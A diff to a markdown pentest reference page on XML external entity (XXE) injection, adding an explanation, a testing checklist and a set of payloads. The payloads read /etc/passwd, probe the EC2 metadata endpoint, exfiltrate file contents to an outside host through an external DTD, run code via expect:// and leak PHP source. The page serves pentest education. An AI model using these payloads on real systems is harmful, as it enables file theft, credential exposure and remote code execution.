@@ -1,5 +1,168 @@
 # XXE
 
+## XXE (XML external entity) injection
+
+### What is it?
+
+XML External Entity (XXE) vulnerabilities occur when an application processes XML input that includes a reference to an external entity. This vulnerability can occur in any technology that parses XML. By exploiting an XXE vulnerability, an attacker can read local files on the server, interact with internal systems, or conduct denial of service attacks.
+
+**A simple example**
+
+A vulnerable application might parse XML input from a user without disabling external entities. An attacker could then send XML like the following:
+
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+```
+
+In this case, the XML parser will replace `&xxe;` with the contents of the `/etc/passwd` file and include it in the output.
+
+XXE can often lead to:
+
+* Disclosure of internal files
+* Server Side Request Forgery (SSRF)
+* Denial of Service
+* Remote Code Execution in some rare cases
+
+**Other learning resources:**
+
+* PortSwigger: [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
+* OWASP: [https://owasp.org/www-community/vulnerabilities/XML\_External\_Entity\_(XXE)\_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing)
+
+**Writeups:**
+
+*
+
+### Checklist
+
+**Objective**
+
+* [ ] Identify endpoints that can process XML
+* [ ] Create a working XML payload that can be adapted to deliver exploits
+* [ ] Test identified endpoints for XXE
+
+**Attack surface discovery**
+
+* [ ] Identify endpoints that accept XML payloads
+  * [ ] Review requests in proxy for XML data
+  * [ ] Identify endpoints that accept JSON by sending XML
+  * [ ] Identify endpoints that accept images by sending SVG images
+  * [ ] Identify endpoints that accept documents by sending DOCX or PDF files
+* [ ] Test with the header `Content-Type: application/xml`
+* [ ] Verify working XML payloads that can be adapted to deliver exploits
+* [ ] Locate internal DTDs
+
+**Testing**
+
+* [ ] Test for external entities with a simple non-malicious payload
+* [ ] Test for external entities with an available file (e.g. for Linux /etc/passwd)
+* [ ] Test for external entities with an available endpoint you control (e.g. collaborator or webhook.site)
+* [ ] Test for external entities with other available endpoints
+  * [ ] EC2 metadata endpoint `http://169.254.169.254/latest/meta-data`
+* [ ] Test filters and restrictions
+  * [ ] Trigger error messages to exfiltrate information
+* [ ] Test for denial of service
+* [ ] Test for code execution
+
+**Impact**
+
+* [ ] Can we read sensitive files?
+  * [ ] Configuration files
+  * [ ] System files
+  * [ ] SQLite files
+  * [ ] SSH keys
+* [ ] Can we exfiltrate sensitive information?
+* [ ] Can we achieve code execution?
+
+### Exploitation
+
+**Sources**
+
+* My pentest notes
+* PortSwigger
+* PayloadsAllTheThings
+
+Detect XXE
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY xxe "test"> ]>
+<foo>
+  <bar>&xxe;</bar>
+</foo>
+```
+
+Include files\
+\&#xNAN;_Note:_ You might need `"file:///etc/passwd"`
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
+<foo>
+  <bar>&xxe;</bar>
+</foo>
+```
+
+List files: _Note:_ Restricted to Java applications
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE aa[<!ELEMENT bb ANY>
+<!ENTITY xxe SYSTEM "file:///">]>
+<foo>
+  <bar>&xxe;</bar>
+</foo>
+```
+
+Out-of-band:
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator"> ]>
+<foo>
+  <bar>&xxe;</bar>
+</foo>
+```
+
+Parameter entities:
+
+```xml
+<!DOCTYPE ase [ <!ENTITY % xxe SYSTEM "http://collaborator"> %xxe; ]>
+```
+
+Load an external DTD:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://our-site.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+Execute code _Note:_ Only works in the PHP 'expect' module is available
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<foo>
+    <bar>&xxe;</bar>
+</foo>
+```
+
+**Include XML as a parameter value**
+
+```xml
+param=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+**Other sources**
+
+* Fuzzing for XXE [https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
+* Fuzzing for local DTDs [https://github.com/GoSecure/dtd-finder/tree/master/list](https://github.com/GoSecure/dtd-finder/tree/master/list)
+
 ### Summary
 
 {% hint style="info" %}
@@ -8,7 +171,7 @@ XML external entity injection (also known as XXE) is a web security vulnerabilit
 
 Detection:
 
-```markup
+```shellscript
 # Content type "application/json" or "application/x-www-form-urlencoded" to "applcation/xml".
 # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.
 # If svg allowed in picture upload, you can inject xml in svgs.
@@ -19,7 +182,7 @@ Detection:
 
 Check:
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE a [<!ENTITY test "THIS IS A STRING!">]>
 <methodCall><methodName>&test;</methodName></methodCall>
@@ -27,7 +190,7 @@ Check:
 
 If works, then:
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE a[<!ENTITY test SYSTEM "file:///etc/passwd">]>
 <methodCall><methodName>&test;</methodName></methodCall>
@@ -35,14 +198,14 @@ If works, then:
 
 ### Tools
 
-```markup
+```shellscript
 # https://github.com/BuffaloWill/oxml_xxe
 # https://github.com/enjoiz/XXEinjector
 ```
 
 ### Attacks
 
-```markup
+```shellscript
 # Get PHP file:
 <?xml version="1.0"?>
 <!DOCTYPE a [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
